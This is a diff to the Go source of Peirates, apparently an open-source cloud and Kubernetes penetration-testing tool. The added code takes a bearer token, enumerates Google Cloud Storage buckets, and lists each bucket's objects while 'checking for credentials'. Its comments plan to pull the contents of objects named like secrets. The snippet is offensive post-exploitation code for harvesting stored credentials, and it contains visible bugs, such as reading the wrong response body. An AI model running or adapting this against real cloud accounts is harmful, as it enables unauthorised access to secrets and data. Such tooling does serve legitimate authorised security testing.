@@ -1444,14 +1444,45 @@ Peirates:># `)
 				resp_list_buckets.Body.Close()
 				break
 			}
-			defer resp_projid.Body.Close()
+			defer resp_list_buckets.Body.Close()
 			body_list_buckets, err := ioutil.ReadAll(resp_list_buckets.Body)
 			bucket_list_lines := strings.Split(string(body_list_buckets), "\n")
-			for _, line := range bucket_list_lines {
-				println(line)
-			}
 
+			// Build our list of bucket URLs
+			var bucket_urls []string
+			for _, line := range bucket_list_lines {
+				if strings.Contains(line, "selfLink") {
+					url := strings.Split(line, "\"")[3]
+					bucket_urls = append(bucket_urls, url)
+				}
+			}
+			// In every bucket URL, look at the objects
 			// Each bucket has a self-link line.  For each one, run that self-link line with /o appended to get an object list.
+			for _, line := range bucket_urls {
+				println("Checking bucket for credentials: ", line)
+				url_list_objects := line + "/o"
+				println("Trying URL", url_list_objects)
+				req_list_objects, err := http.NewRequest("GET", url_list_objects, nil)
+				req_list_objects.Header.Add("Metadata-Flavor", "Google")
+				bearer_token := "Bearer " + token
+				req_list_objects.Header.Add("Authorization", bearer_token)
+				req_list_objects.Header.Add("Accept", "json")
+				resp_list_objects, err := ssl_client.Do(req_list_objects)
+				if err != nil {
+					log.Fatal(err)
+					fmt.Printf("Error - could not perform request --%s--\n", url_list_objects)
+					resp_list_objects.Body.Close()
+					break
+				}
+				defer resp_list_objects.Body.Close()
+				body_list_objects, err := ioutil.ReadAll(resp_list_buckets.Body)
+				object_list_lines := strings.Split(string(body_list_objects), "\n")
+
+				// print each bucket list line - later we'll inspect for useful stuff.
+				for _, line := range object_list_lines {
+					println("-", line)
+				}
+			}
 
 			// Run through the object list, finding those with /secret in them.  While URL-encoding each object, appending ?alt=media to get the contents.
 
